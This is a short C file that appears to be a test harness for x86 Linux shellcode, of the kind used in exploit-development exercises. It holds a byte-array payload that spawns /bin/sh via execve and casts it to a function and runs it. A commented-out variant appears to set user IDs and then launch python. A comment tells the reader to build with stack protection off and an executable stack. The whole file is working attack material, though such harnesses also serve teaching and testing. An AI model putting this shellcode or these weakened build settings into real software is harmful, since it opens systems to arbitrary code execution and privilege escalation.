// Remember to build with gcc -fno-stack-protector -z execstack!

#include <stdio.h>
#include <string.h>

//unsigned char shellcode[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x0f\x89\x5b\x10\x89\x43\x14\xb0\x0b\x8d\x4b\x10\x8d\x53\x14\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e"; 

unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80"; 

int main(void)
{
    printf("Shellcode length: %d\n", strlen(shellcode));

//    __asm__ (    "mov $0xffffffff, %eax\n\t"
//                 "mov %eax, %ebx\n\t"
//                 "mov %eax, %ecx\n\t"
//                 "mov %eax, %edx\n\t"
//                 "mov %eax, %esi\n\t"
//                 "mov %eax, %edi\n\t"
//                 "mov %eax, %ebp\n\t"
//
//                 "call shellcode"   );

    
    (*(void(*)(void))shellcode)();

    return 0;
}
